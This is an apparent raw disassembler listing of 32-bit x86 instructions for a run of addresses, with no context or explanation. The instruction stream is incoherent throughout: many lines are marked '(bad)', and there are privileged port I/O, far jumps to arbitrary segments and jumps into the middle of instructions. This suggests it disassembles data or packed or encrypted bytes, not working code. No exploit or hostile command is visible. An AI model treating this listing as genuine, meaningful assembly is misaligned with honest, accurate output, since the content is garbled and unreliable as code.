  419957:	test   DWORD PTR [edi+esi*4],esi
  41995a:	mov    bh,0x53
  41995c:	sbb    edi,DWORD PTR [esp+eiz*8-0x34]
  419960:	mov    ebp,0x66ea7692
  419965:	rcl    ebx,1
  419967:	or     al,0x4b
  419969:	or     dl,BYTE PTR [esi]
  41996b:	test   BYTE PTR [edx-0x10],ch
  41996e:	add    eax,0x4c8c1104
  419973:	rcr    BYTE PTR [edi+0x33],cl
  419976:	nop
  419977:	mov    dl,0xe
  419979:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41997a:	sbb    al,0x15
  41997c:	xlat   BYTE PTR ds:[ebx]
  41997d:	out    0xef,eax
  41997f:	ins    DWORD PTR es:[edi],dx
  419980:	scas   al,BYTE PTR es:[edi]
  419981:	add    al,dh
  419983:	jae    0x419999
  419985:	fldenv [esi+0x2e]
  419988:	push   ss
  419989:	sbb    BYTE PTR [eax-0x30],ah
  41998c:	out    0x8e,al
  41998e:	out    0x14,al
  419990:	sub    DWORD PTR [ecx-0x600e2844],esi
  419996:	das    
  419997:	mov    ecx,0xaff08c22
  41999c:	inc    edi
  41999d:	add    esp,DWORD PTR [ebx]
  41999f:	sub    ebx,ebp
  4199a1:	mov    al,0xd5
  4199a3:	daa    
  4199a4:	push   0xb3f7c761
  4199a9:	cwde   
  4199aa:	imul   edi,DWORD PTR [esi+0x56],0xdcef37c4
  4199b1:	call   0xe3ca654a
  4199b6:	push   eax
  4199b7:	aam    0xb6
  4199b9:	imul   ebp,DWORD PTR [eax-0x7fc4f848],0xffffffa7
  4199c0:	dec    esi
  4199c1:	bound  esp,QWORD PTR [ebp+0x5f9e580]
  4199c7:	pop    ecx
  4199c8:	fs and eax,0x7232d77a
  4199ce:	adc    ebx,0x20ba7d66
  4199d4:	sbb    BYTE PTR [esi],bh
  4199d6:	mov    esp,0xe961b4ae
  4199db:	dec    ebp
  4199dc:	rol    DWORD PTR [edx-0x35],0xef
  4199e0:	lods   al,BYTE PTR ds:[esi]
  4199e1:	xchg   edi,eax
  4199e2:	mov    ah,0x59
  4199e4:	fisub  WORD PTR [edi-0x449ca470]
  4199ea:	(bad)  
  4199eb:	dec    ecx
  4199ec:	or     al,0x51
  4199ee:	mov    ebp,0x25ef5c36
  4199f3:	gs xchg edi,eax
  4199f5:	lods   eax,DWORD PTR ds:[esi]
  4199f6:	fist   DWORD PTR [ebp-0x2c616014]
  4199fc:	scas   eax,DWORD PTR es:[edi]
  4199fd:	sub    dl,dl
  4199ff:	cmp    DWORD PTR [ebx],eax
  419a01:	jb     0x41999b
  419a03:	fmul   QWORD PTR [ecx+0x4b9ca93f]
  419a09:	ss jmp 0x4199a0
  419a0c:	mov    al,0xe4
  419a0e:	sbb    dh,BYTE PTR [edx+edx*1+0x57b693d2]
  419a15:	shl    dl,0xad
  419a18:	xchg   BYTE PTR [edi-0x5dca161f],cl
  419a1e:	in     al,0xa9
  419a20:	shl    BYTE PTR [ebx-0x55],0x32
  419a24:	mov    ds:0x15fdd819,eax
  419a29:	dec    eax
  419a2a:	test   DWORD PTR [edi+esi*2],ebx
  419a2d:	idiv   BYTE PTR [ebx+0x7fc6badb]
  419a33:	push   ss
  419a34:	stos   BYTE PTR es:[edi],al
  419a35:	dec    DWORD PTR [esi]
  419a37:	ds std 
  419a39:	pop    edx
  419a3a:	sbb    bl,dl
  419a3c:	outs   dx,DWORD PTR ds:[esi]
  419a3d:	aad    0xec
  419a3f:	pop    esp
  419a40:	(bad)  
  419a42:	mov    ecx,0x44b81339
  419a47:	mov    bl,0xe2
  419a49:	sub    al,0xaa
  419a4b:	fnstenv [ebx]
  419a4d:	sub    al,0xc9
  419a4f:	rol    bh,0x4d
  419a52:	mov    eax,0xa3ab942b
  419a57:	push   ebx
  419a58:	inc    eax
  419a59:	(bad)  
  419a5a:	aam    0x60
  419a5c:	mov    WORD PTR [edx],?
  419a5e:	lahf   
  419a5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a60:	pop    ds
  419a61:	in     al,dx
  419a62:	ins    BYTE PTR es:[edi],dx
  419a63:	pop    es
  419a64:	mov    al,ds:0x8f21c1f3
  419a69:	outs   dx,DWORD PTR ds:[esi]
  419a6a:	ja     0x419a73
  419a6c:	ror    BYTE PTR [edi+0x50f0a380],1
  419a72:	xor    DWORD PTR [ebx],esp
  419a74:	mov    ah,0x14
  419a76:	iret   
  419a77:	dec    ebp
  419a78:	daa    
  419a79:	add    dl,BYTE PTR [ebp+esi*8-0x51]
  419a7d:	test   DWORD PTR [eax-0x3577881f],ebp
  419a83:	pusha  
  419a84:	in     al,0x75
  419a86:	xor    dh,BYTE PTR [ebx+0x78]
  419a89:	xchg   ebx,eax
  419a8a:	arpl   WORD PTR [esi],si
  419a8c:	push   ss
  419a8d:	test   al,0x18
  419a8f:	lods   eax,DWORD PTR ds:[esi]
  419a90:	mov    ebx,0x2d89d559
  419a95:	or     bl,BYTE PTR [eax]
  419a97:	sahf   
  419a98:	ins    DWORD PTR es:[edi],dx
  419a99:	lea    esp,[ecx-0x4db8be56]
  419a9f:	in     al,0xb5
  419aa1:	jecxz  0x419af7
  419aa3:	mov    eax,0xed54424e
  419aa8:	mov    BYTE PTR [ebx],dh
  419aaa:	pop    ebp
  419aab:	les    ebp,FWORD PTR [eax-0x466630da]
  419ab1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ab2:	out    0x8f,eax
  419ab4:	or     ecx,ecx
  419ab6:	sub    al,0x1f
  419ab8:	or     BYTE PTR [esi-0x4e],0xb4
  419abc:	xchg   edx,eax
  419abd:	arpl   bp,bx
  419abf:	adc    edi,esi
  419ac1:	xchg   esp,eax
  419ac2:	sub    al,0xd
  419ac4:	xor    dh,al
  419ac6:	(bad)  
  419ac7:	icebp  
  419ac8:	mov    ds:0x51a605c1,al
  419acd:	inc    esp
  419ace:	ret    0xfa5c
  419ad1:	jo     0x419a92
  419ad3:	jae    0x419a6c
  419ad5:	adc    BYTE PTR [ebx+esi*8],bl
  419ad8:	push   eax
  419ad9:	add    esi,ecx
  419adb:	xchg   ebx,eax
  419adc:	sub    DWORD PTR [edx],esi
  419ade:	retf   0xfbf7
  419ae1:	xchg   DWORD PTR [eax],edx
  419ae3:	xchg   ecx,eax
  419ae4:	mov    cs,WORD PTR [ebx-0x3d]
  419ae7:	ret    
  419ae8:	out    0x1e,eax
  419aea:	add    al,0x97
  419aec:	or     DWORD PTR es:[edx+ebp*4],edi
  419af0:	mov    es,esi
  419af2:	repnz stos BYTE PTR es:[edi],al
  419af4:	mov    eax,0xf60f537b
  419af9:	jne    0x419ad6
  419afb:	inc    ebx
  419afc:	jmp    0x174a:0x308aca80
  419b03:	xor    ecx,DWORD PTR [esi]
  419b05:	add    al,0x19
  419b07:	sub    DWORD PTR [edx-0x65962344],edx
  419b0d:	stos   BYTE PTR es:[edi],al
  419b0e:	mov    ebp,0x729c135f
  419b13:	jno    0x419a9e
  419b15:	sahf   
  419b16:	sahf   
  419b17:	icebp  
  419b18:	out    dx,eax
  419b19:	pop    es
  419b1a:	loopne 0x419adc
  419b1c:	push   esp
  419b1d:	push   ecx
  419b1e:	sub    BYTE PTR [eax],bl
  419b20:	add    esp,DWORD PTR [ebx]
  419b22:	inc    ebp
  419b23:	xchg   eax,eax
  419b25:	test   eax,0x7a20c073
  419b2a:	cmc    
  419b2b:	retf   
  419b2c:	sub    edx,eax
  419b2e:	cmp    ch,cl
  419b30:	add    BYTE PTR [edi+0x3c],bl
  419b33:	test   BYTE PTR [ebx-0x30be0c2a],ch
  419b39:	sub    bl,BYTE PTR [eax+0x6417b3d8]
  419b3f:	mov    esp,0x1d303dc9
  419b44:	leave  
  419b45:	ret    0xf2c
  419b48:	mov    ds:0xb0ca94bd,eax
  419b4d:	mov    al,ds:0x63b7c573
  419b52:	adc    eax,0x4b373dc9
  419b57:	mov    ecx,0x5d9824ad
  419b5c:	inc    ebx
  419b5d:	cwde   
  419b5e:	jae    0x419ba9
  419b60:	inc    edx
  419b61:	(bad)  [ebp+0x41a6921a]
  419b67:	(bad)  
  419b68:	ins    DWORD PTR es:[edi],dx
  419b69:	cmp    BYTE PTR [ebx],al
  419b6b:	inc    esp
  419b6c:	popa   
  419b6d:	inc    BYTE PTR [ebx+0x37d45131]
  419b73:	je     0x419ba9
  419b75:	fwait
  419b76:	or     dl,BYTE PTR [ecx+0x75cac6b]
  419b7c:	adc    ch,cl
  419b7e:	xlat   BYTE PTR ds:[ebx]
  419b7f:	jns    0x419be8
  419b81:	mov    bh,0x23
  419b83:	or     eax,0xea7c3737
  419b88:	aam    0x2b
  419b8a:	inc    esp
  419b8b:	inc    edx
  419b8c:	shr    BYTE PTR [edi-0x51],0x9d
  419b90:	cdq    
  419b91:	dec    ebp
  419b92:	xchg   ecx,eax
  419b93:	loopne 0x419be3
  419b95:	cli    
  419b96:	mov    ecx,ecx
  419b98:	(bad)  
  419b99:	sub    edx,DWORD PTR [esi-0xa]
  419b9c:	pop    es
  419b9d:	push   ss
  419b9e:	iret   
  419b9f:	sub    DWORD PTR [ebp-0x72],ecx
  419ba2:	test   BYTE PTR [ebx+0x3a],ch
  419ba5:	mov    edi,DWORD PTR [ebx+0x610aa00a]
  419bab:	pop    edi
  419bac:	ror    DWORD PTR [ebx+0x60a1169e],cl
  419bb2:	cld    
  419bb3:	jl     0x419bfa
  419bb5:	mov    BYTE PTR [eax-0x2fd82d6d],ch
  419bbb:	sub    DWORD PTR [edx-0x3c],edi
  419bbe:	das    
  419bbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bc0:	pop    ds
  419bc1:	iret   
  419bc2:	outs   dx,DWORD PTR ds:[esi]
  419bc3:	mov    ah,0x66
  419bc5:	xchg   ebp,eax
  419bc6:	adc    edx,DWORD PTR [esi]
  419bc8:	popf   
  419bc9:	inc    esi
  419bca:	xor    ah,BYTE PTR [ebp-0x10aa094f]
  419bd0:	fisub  DWORD PTR [esi-0xc]
  419bd3:	inc    edi
  419bd4:	or     esp,DWORD PTR [edi-0x26]
  419bd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bd8:	fcmovnb st,st(6)
  419bda:	je     0x419b83
  419bdc:	push   ebx
  419bdd:	lods   al,BYTE PTR ds:[esi]
  419bde:	loope  0x419c2b
  419be0:	sub    ah,dh
  419be2:	xchg   ebx,eax
  419be3:	cmc    
  419be4:	faddp  st(6),st
  419be6:	add    BYTE PTR [eax],ah
  419be8:	inc    ebx
  419be9:	inc    esi
  419bea:	jbe    0x419c3d
  419bec:	or     al,0xe2
  419bee:	cmp    ecx,ecx
  419bf0:	xchg   esp,eax
  419bf1:	(bad)  
  419bf2:	jg     0x419ba6
  419bf4:	and    ebp,DWORD PTR [ebx+eiz*4]
  419bf7:	dec    esi
  419bf8:	jge    0x419bfb
  419bfa:	jb     0x419bc9
  419bfc:	push   ebp
  419bfd:	dec    ebx
  419bfe:	lods   eax,DWORD PTR ds:[esi]
  419bff:	add    ch,dl
  419c01:	sti    
  419c02:	push   ebx
  419c03:	out    dx,eax
  419c04:	and    al,0xec
  419c06:	push   ss
  419c07:	xor    DWORD PTR [eax+0x6b],ebp
  419c0a:	test   DWORD PTR [ecx+0x77e13dc],edx
  419c10:	mov    al,ds:0xb057206b
  419c15:	adc    ah,bh
  419c17:	adc    al,0x35
  419c19:	pop    esi
  419c1a:	mov    edx,0xb967ea3c
  419c1f:	call   0x1d2c:0xcfb84fa6
  419c26:	or     BYTE PTR [esi],bh
  419c28:	es call 0xab8101fa
  419c2e:	and    al,BYTE PTR [ebx-0x7e]
  419c31:	cdq    
  419c32:	out    dx,al
  419c33:	(bad)  
  419c34:	cmc    
  419c35:	jmp    0x419c6f
  419c37:	test   DWORD PTR [esi-0x147bb55d],edi
  419c3d:	ds sub al,0xf6
  419c40:	imul   edx,DWORD PTR [ebx],0xe27fe5e4
  419c46:	ret    
  419c47:	pop    ss
  419c48:	mov    cl,0xc6
  419c4a:	and    eax,0x21f06d39
  419c4f:	pop    ebx
  419c50:	xchg   edx,eax
  419c51:	mov    bh,0x90
  419c53:	push   0x2375d5e4
  419c58:	(bad)  
  419c59:	outs   dx,DWORD PTR ds:[esi]
  419c5a:	xchg   ebx,eax
  419c5b:	bnd jge 0x419c04
  419c5e:	imul   BYTE PTR [ecx-0x66]
  419c61:	jbe    0x419c92
  419c63:	aaa    
  419c64:	or     DWORD PTR [ebx],edx
  419c66:	or     ebp,DWORD PTR [ebx+esi*1-0x24cb765]
  419c6d:	ficomp WORD PTR [eax+0xb]
  419c70:	mov    ebx,0x4d354ff8
  419c75:	add    al,0x35
  419c77:	call   0x630f:0xf254f6a8
  419c7e:	dec    ebp
  419c7f:	fidivr WORD PTR ds:0x146e66b3
  419c85:	add    ebx,ecx
  419c87:	jg     0x419c90
  419c89:	ss mov bh,0x3e
  419c8c:	inc    edx
  419c8d:	cli    
  419c8e:	or     BYTE PTR [edi],al
  419c90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c91:	inc    ebp
  419c92:	cmp    DWORD PTR [eax+0x27],eax
  419c95:	test   eax,0x717e632b
  419c9a:	inc    ebp
  419c9b:	ret    0x17e7
  419c9e:	sub    ebp,DWORD PTR [eax-0x6051b022]
  419ca4:	sbb    edx,DWORD PTR [ecx+esi*1]
  419ca7:	into   
  419ca8:	shl    BYTE PTR [edi],1
  419caa:	cmp    DWORD PTR ss:0x32ecdf76,edi
  419cb1:	daa    
  419cb2:	push   ss
  419cb3:	je     0x419c93
  419cb5:	adc    esi,DWORD PTR [ebx]
  419cb7:	push   eax
  419cb8:	leave  
  419cb9:	jge    0x419c73
  419cbb:	pop    eax
  419cbc:	cdq    
  419cbd:	pop    esi
  419cbe:	push   es
  419cbf:	or     bl,BYTE PTR [ecx]
  419cc1:	(bad)  
  419cc2:	test   BYTE PTR ss:[esp+edx*1+0x666411ce],dh
  419cca:	xchg   BYTE PTR [edi+0x19838cf5],al
  419cd0:	in     al,0xf5
  419cd2:	out    0x9f,al
  419cd4:	nop
  419cd5:	mov    eax,0x1b57120f
  419cda:	jp     0x419cea
  419cdc:	out    dx,eax
  419cdd:	adc    eax,0x563112a0
  419ce2:	imul   ecx,DWORD PTR [esi+edx*4+0x4b],0xffffff84
  419ce7:	retf   
  419ce8:	sar    BYTE PTR [ecx+0x6e1103fe],1
  419cee:	mov    eax,ds:0x3c05f6f5
  419cf3:	rol    DWORD PTR [ebp-0x32],0xe2
  419cf7:	push   cs
  419cf8:	push   eax
  419cf9:	in     eax,dx
  419cfa:	cmp    bh,al
  419cfc:	call   0x3e09:0x80eafb93
  419d03:	mov    ds:0xbadd90c2,eax
  419d08:	push   esp
  419d09:	repz es ret 0xa86d
  419d0e:	pop    ds
  419d0f:	mov    ch,0x78
  419d11:	in     al,0x46
  419d13:	adc    BYTE PTR [esi],ch
  419d15:	adc    bh,BYTE PTR [eax]
  419d17:	xor    bl,al
  419d19:	dec    ecx
  419d1a:	(bad)  [eax-0x30]
  419d1d:	out    0xdb,eax
  419d1f:	xor    BYTE PTR [edi],dh
  419d21:	int3   
  419d22:	(bad)  
  419d23:	adc    eax,0x14aceee6
  419d28:	idiv   DWORD PTR [ebx-0x3b]
  419d2b:	inc    ecx
  419d2c:	jmp    0x51743652
  419d31:	adc    BYTE PTR [esi],bh
  419d33:	mov    eax,ds:0xc66d8b6d
  419d38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d39:	xor    BYTE PTR [esi],bl
  419d3b:	sbb    DWORD PTR [eax+0x17],edx
  419d3e:	(bad)  
  419d3f:	in     al,0x15
  419d41:	es cmp edi,ebx
  419d44:	adc    eax,0x7a7bfd05
  419d49:	push   esp
  419d4a:	xchg   edi,eax
  419d4b:	jmp    0x419d06
  419d4d:	xor    bh,al
  419d4f:	(bad)  
  419d51:	retf   
  419d52:	(bad)  
  419d53:	(bad)  
  419d54:	jmp    0x671b:0x9275b78f
  419d5b:	ja     0x419d3f
  419d5d:	push   edx
  419d5e:	and    ecx,DWORD PTR [edx+eax*8+0x26]
  419d62:	js     0x419dcf
  419d64:	inc    esi
  419d65:	xlat   BYTE PTR ds:[ebx]
  419d66:	daa    
  419d67:	and    WORD PTR [edx+ebp*8+0x6272d95e],sp
  419d6f:	inc    eax
  419d70:	push   0x3a
  419d72:	ins    DWORD PTR es:[edi],dx
  419d73:	aas    
  419d74:	jmp    0xc33f:0x942cced3
  419d7b:	mov    ds:0xfdf10c5,al
  419d80:	popf   
  419d81:	mov    WORD PTR [esi-0x738246d8],?
  419d87:	jp     0x419db6
  419d89:	jmp    0x4c7e:0xceb7d97e
  419d90:	jbe    0x419d75
  419d92:	inc    esi
  419d93:	jne    0x419de9
  419d95:	inc    edi
  419d96:	(bad)  
  419d98:	sub    ah,BYTE PTR [ebx]
  419d9a:	in     al,0xf4
  419d9c:	jbe    0x419df6
  419d9e:	adc    al,0x51
  419da0:	mov    esp,0x2f427b7a
  419da5:	xchg   esp,eax
  419da6:	not    BYTE PTR [esi+edx*1+0x5f]
  419daa:	out    0x7f,eax
  419dac:	aam    0xfb
  419dae:	xchg   esi,eax
  419daf:	cmp    DWORD PTR [esi+0x1d],esp
  419db2:	inc    esp
  419db3:	rcl    BYTE PTR [edx-0xdefd86b],1
  419db9:	push   ds
  419dba:	pop    esi
  419dbb:	mov    esi,0x5ca68014
  419dc0:	gs jg  0x419d98
  419dc3:	xchg   ecx,eax
  419dc4:	sub    al,0xf8
  419dc6:	or     al,0xa3
  419dc8:	(bad)  
  419dc9:	div    BYTE PTR [edi+0x36]
  419dcc:	sub    dh,BYTE PTR [edx+eiz*8]
  419dcf:	adc    al,al
  419dd1:	popf   
  419dd2:	jle    0x419df1
  419dd4:	and    eax,0xb97941b2
  419dd9:	fmul   st(7),st
  419ddb:	je     0x419dc1
  419ddd:	jge    0x419de3
  419ddf:	dec    eax
  419de0:	jecxz  0x419dd2
  419de2:	test   eax,0x1272eac0
  419de7:	xor    cl,BYTE PTR [bp+di-0x6f93]
  419dec:	sbb    BYTE PTR [ebp+0x2],bl
  419def:	add    ah,ah
  419df1:	pop    edx
  419df2:	jp     0x419d96
  419df4:	sbb    al,0x58
  419df6:	xor    al,0x50
  419df8:	hlt    
  419df9:	enter  0xf36e,0x5c
  419dfd:	in     al,0x19
  419dff:	in     al,dx
  419e00:	mov    edi,0x7243a751
  419e05:	inc    edx
  419e06:	into   
  419e07:	out    0x4a,al
  419e09:	inc    ebp
  419e0a:	adc    ch,BYTE PTR [ecx]
  419e0c:	cld    
  419e0d:	imul   BYTE PTR [edi-0x34]
  419e10:	jp     0x419dcf
  419e12:	xchg   edx,eax
  419e13:	cdq    
  419e14:	into   
  419e15:	mov    eax,ds:0x6694c960
  419e1a:	push   cs
  419e1b:	aad    0xd1
  419e1d:	mov    esi,0xe6f5cf17
  419e22:	sub    eax,esp
  419e24:	test   al,ch
  419e26:	je     0x419e4c
  419e28:	in     eax,dx
  419e29:	fisubr DWORD PTR [ecx]
  419e2b:	add    DWORD PTR [edi+ebx*2+0x63],edi
  419e2f:	and    ebx,DWORD PTR [ebx+0x558e1744]
  419e35:	lds    edx,FWORD PTR [eax+0x56]
  419e38:	jl     0x419ea9
  419e3a:	mov    esi,0x3b710ef3
  419e3f:	adc    al,0x70
  419e41:	mov    dh,0x62
  419e43:	inc    ebx
  419e44:	aaa    
  419e45:	inc    ebx
  419e46:	sbb    ebx,DWORD PTR [ebx+0x70]
  419e49:	add    DWORD PTR [ecx+0x30],eax
  419e4c:	inc    edx
  419e4d:	adc    al,0x6b
  419e4f:	xor    al,0x7e
  419e51:	pop    esi
  419e52:	adc    BYTE PTR [ecx-0x342ef4bc],0x68
  419e59:	mov    DWORD PTR [ebx+0x41],eax
  419e5c:	xchg   ecx,eax
  419e5d:	ins    BYTE PTR es:[edi],dx
  419e5e:	test   al,0x44
  419e60:	jmp    0x419dec
  419e62:	popa   
  419e63:	push   edi
  419e64:	ret    
  419e65:	(bad)  
  419e66:	mov    edi,0xe9a91455
  419e6b:	jns    0x419df3
  419e6d:	mov    dl,0xf4
  419e6f:	mov    esp,fs
  419e71:	jns    0x419dfd
  419e73:	push   ss
  419e74:	cld    
  419e75:	sub    BYTE PTR [ebx],bl
  419e77:	mov    cl,0x6e
  419e79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e7a:	xlat   BYTE PTR ds:[ebx]
  419e7b:	out    dx,eax
  419e7c:	cdq    
  419e7d:	jae    0x419e1d
  419e7f:	jb     0x419eac
  419e81:	imul   esi,esp,0x27
  419e84:	jne    0x419e20
  419e86:	cwde   
  419e87:	hlt    
  419e88:	out    0xe5,al
  419e8a:	sbb    DWORD PTR [eax+ecx*4],esp
  419e8d:	and    ebp,DWORD PTR [edi-0x68]
  419e90:	out    0x5,al
  419e92:	jo     0x419e39
  419e94:	stc    
  419e95:	fdivr  QWORD PTR [edi-0x35a9e847]
  419e9b:	sti    
  419e9c:	je     0x419e7f
  419e9e:	sub    ebx,ecx
  419ea0:	iret   
  419ea1:	pop    esi
  419ea2:	fadd   QWORD PTR [esi]
  419ea4:	ja     0x419ebb
  419ea6:	and    BYTE PTR [esi],ah
  419ea8:	mov    BYTE PTR [ebp+eiz*1+0x8dc65a7],bl
  419eaf:	xor    dl,BYTE PTR [eax+0x2a]
  419eb2:	enter  0xc53a,0x50
  419eb6:	and    al,0xf9
  419eb8:	and    eax,edx
  419eba:	frstor [esi+0x2d79e8dd]
  419ec0:	out    0x5e,eax
  419ec2:	mov    ah,BYTE PTR [edi]
  419ec4:	(bad)  
  419ec5:	mov    ds:0xbe0d4de6,al
  419eca:	add    ebx,ecx
  419ecc:	pop    esp
  419ecd:	sbb    al,0xfd
  419ecf:	sub    ecx,DWORD PTR ds:0xbdd2685b
  419ed6:	mov    esp,0x51a5119b
  419edb:	(bad)  [ebp-0x6d2a0be]
  419ee1:	xor    eax,0xdf56894b
  419ee6:	(bad)
  419ee9:	loopne 0x419e79
  419eeb:	scas   eax,DWORD PTR es:[edi]
  419eec:	and    eax,0xc1d6cfdb
  419ef1:	shr    DWORD PTR [edx],0x35
  419ef4:	add    eax,0x86a8c04e
  419ef9:	adc    edx,DWORD PTR [esi+ebp*8-0x1b352daf]
  419f00:	and    eax,0xa8af7c04
  419f05:	test   al,0x73
  419f07:	into   
  419f08:	(bad)  
  419f0a:	mov    dh,0xa9
  419f0c:	or     al,0xcf
  419f0e:	cmp    ah,BYTE PTR [ecx+0x285b97e0]
  419f14:	stc    
  419f15:	scas   al,BYTE PTR es:[edi]
  419f16:	push   edi
  419f17:	test   DWORD PTR [eax+ebx*4-0x2676b74],esp
  419f1e:	ins    DWORD PTR es:[edi],dx
  419f1f:	fs div edi
  419f22:	(bad)
  419f25:	movd   mm4,esp
  419f28:	mov    ebp,0x7c3d0e43
  419f2d:	mov    ah,0x6c
  419f2f:	adc    BYTE PTR [ebp-0x15405fa4],ch
  419f35:	cs enter 0x9bc6,0x93
  419f3a:	loop   0x419f0b
  419f3c:	fbstp  TBYTE PTR gs:0x89670d4
  419f43:	xor    DWORD PTR [edi],esi
  419f45:	fwait
  419f46:	xchg   ebp,eax
  419f47:	int3   
  419f48:	cwde   
  419f49:	sub    ebp,DWORD PTR [ecx-0x711792c8]
  419f4f:	leave  
  419f50:	pop    esi
  419f51:	or     eax,0x49c8d145
  419f56:	xor    DWORD PTR [esi+0x3be50d50],ecx
  419f5c:	ds ins BYTE PTR es:[edi],dx
  419f5e:	sar    BYTE PTR [eax+0x1a0a93ed],0xdc
  419f65:	idiv   BYTE PTR [ebx-0x12]
  419f68:	or     eax,0x9f523be5
  419f6d:	dec    edi
  419f6e:	iret   
  419f6f:	imul   edi,DWORD PTR [ebx-0x40],0xffffffbf
  419f73:	push   ebp
  419f74:	xlat   BYTE PTR ds:[ebx]
  419f75:	jle    0x419f58
  419f77:	xchg   BYTE PTR [ebx-0x15],bh
  419f7a:	aam    0x26
  419f7c:	and    eax,0xa901442
  419f81:	mov    al,ds:0xcddfb8c
  419f86:	sbb    esp,DWORD PTR [ebx-0x77]
  419f89:	cmp    eax,0x3fe75c16
  419f8e:	or     BYTE PTR [ebx-0x179fedad],cl
  419f94:	daa    
  419f95:	pop    es
  419f96:	push   ss
  419f97:	sbb    al,0xec
  419f99:	aaa    
  419f9a:	pusha  
  419f9b:	push   es
  419f9c:	stos   BYTE PTR es:[edi],al
  419f9d:	stos   BYTE PTR es:[edi],al
  419f9e:	cmp    edi,eax
  419fa0:	jmp    0x419f39
  419fa2:	jno    0x41a014
  419fa4:	mov    WORD PTR [ebp-0x7ef12167],fs
  419faa:	(bad)  
  419fab:	mov    al,ds:0x78206e5e
  419fb0:	push   ecx
  419fb1:	sub    eax,DWORD PTR [esi+0x447ea870]
  419fb7:	push   ebx
  419fb8:	jge    0x419fc8
  419fba:	adc    DWORD PTR [ebp+0x132d6301],0xb752df32
  419fc4:	push   ebp
  419fc5:	cmp    DWORD PTR [esi+0x67940597],esp
  419fcb:	not    BYTE PTR [ebx+0x6d]
  419fce:	data16 ss and al,0xf4
  419fd2:	mov    esp,0xa537a2a
  419fd7:	xchg   esp,eax
  419fd8:	add    eax,0xdc76a5bb
  419fdd:	pop    ss
  419fde:	jne    0x419fc6
  419fe0:	add    ah,cl
  419fe2:	outs   dx,BYTE PTR ds:[esi]
  419fe3:	daa    
  419fe4:	push   eax
  419fe5:	pop    esi
  419fe6:	iret   
  419fe7:	pop    edx
  419fe8:	aas    
  419fe9:	loop   0x419fc9
  419feb:	ss push ds
  419fed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fee:	call   0x8f9b7a9e
  419ff3:	pop    ss
  419ff4:	xor    BYTE PTR [ebx+eax*2],al
  419ff7:	imul   esi,ebx,0x45
  419ffa:	and    BYTE PTR [esi-0x43bac8e5],al
  41a000:	mov    ds:0x394c30d9,al
  41a005:	fs pmaxub mm1,mm4
  41a009:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a00a:	lock ds pop ebp
  41a00d:	xchg   ebp,eax
  41a00e:	imul   esi,DWORD PTR [edx-0x1c],0x8788c2e4
  41a015:	add    BYTE PTR [ebx-0x2251edbe],ch
  41a01b:	mov    al,ds:0x3536072b
  41a020:	mov    ds:0x267d898a,al
  41a025:	sbb    al,BYTE PTR [ebx+0x42]
  41a028:	ins    DWORD PTR es:[edi],dx
  41a029:	jl     0x41a06f
  41a02b:	push   ds
  41a02c:	gs (bad) 
  41a02e:	adc    al,0x46
  41a030:	inc    edx
  41a031:	(bad)  
  41a032:	jmp    0x41a019
  41a034:	and    BYTE PTR [ebp-0x74],ah
  41a037:	enter  0x13cf,0xd0
  41a03b:	push   ss
  41a03c:	jmp    0x2fad2b29
  41a041:	out    dx,al
  41a042:	mov    al,ds:0x829c483f
  41a047:	xlat   BYTE PTR ds:[ebx]
  41a048:	mov    dh,0x88
  41a04a:	and    BYTE PTR [edx-0x4a9a4716],bh
  41a050:	inc    ebx
  41a051:	loope  0x41a059
  41a053:	out    dx,eax
  41a054:	neg    DWORD PTR ds:0xa40f9690
  41a05a:	pop    esp
  41a05b:	inc    ebp
  41a05c:	inc    ebp
  41a05d:	iret   
  41a05e:	jae    0x41a034
  41a060:	mov    esi,0x4bb72979
  41a065:	and    al,0x98
  41a067:	lods   eax,DWORD PTR ds:[esi]
  41a068:	(bad)  
  41a069:	xor    DWORD PTR [ebp+eiz*1+0x789f8b0a],ebx
  41a070:	mov    dh,0x85
  41a072:	aad    0x8e
  41a074:	cmp    eax,0x581c171c
  41a079:	std    
  41a07a:	cld    
  41a07b:	xor    cl,BYTE PTR [edx+0xa2306b5]
  41a081:	mov    al,ds:0x2ec31a33
  41a086:	push   ebp
  41a087:	retf   0x285a
  41a08a:	ret    
  41a08b:	and    eax,0x5dcea9c8
  41a090:	sub    DWORD PTR [esi+esi*1+0x46a2b2bc],ecx
  41a097:	adc    al,0xb7
  41a099:	scas   eax,DWORD PTR es:[edi]
  41a09a:	xchg   edx,edi
  41a09c:	imul   eax,ebp,0x3f88a563
  41a0a2:	mov    esp,DWORD PTR [ebx-0x5be487eb]
  41a0a8:	adc    edi,0x13
  41a0ab:	sbb    BYTE PTR [ecx+0xa],dl
  41a0ae:	sbb    eax,0x2bf2420c
  41a0b3:	(bad)  
  41a0b4:	fmulp  st(2),st
  41a0b6:	fst    QWORD PTR [eax-0x4e98c8ca]
  41a0bc:	lods   al,BYTE PTR ds:[esi]
  41a0bd:	loopne 0x41a130
  41a0bf:	test   eax,0x9e5d0450
  41a0c4:	push   esi
  41a0c5:	push   esi
  41a0c6:	cmp    BYTE PTR [edi-0x69292d00],bl
  41a0cc:	dec    ebp
  41a0cd:	add    edx,DWORD PTR ds:0x120dcda5
  41a0d3:	ss cmp eax,0x662019a0
  41a0d9:	push   ds
  41a0da:	cmp    eax,eax
  41a0dc:	push   0x9fd813fd
  41a0e1:	in     eax,0x9c
  41a0e3:	(bad)  
  41a0e4:	pop    edx
  41a0e5:	xlat   BYTE PTR ds:[ebx]
  41a0e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0e7:	jmp    0x7cd4:0xae89468
  41a0ee:	hlt    
  41a0ef:	not    BYTE PTR [edi]
  41a0f1:	leave  
  41a0f2:	stos   DWORD PTR es:[edi],eax
  41a0f3:	xchg   ebx,eax
  41a0f4:	sahf   
  41a0f5:	add    cl,dh
  41a0f7:	in     eax,dx
  41a0f8:	lahf   
  41a0f9:	(bad)  
  41a0fa:	xor    BYTE PTR ds:0x53e2b18b,cl
  41a100:	xchg   edi,eax
  41a101:	jge    0x41a08a
  41a103:	dec    edi
  41a104:	les    eax,FWORD PTR [eax-0x1f]
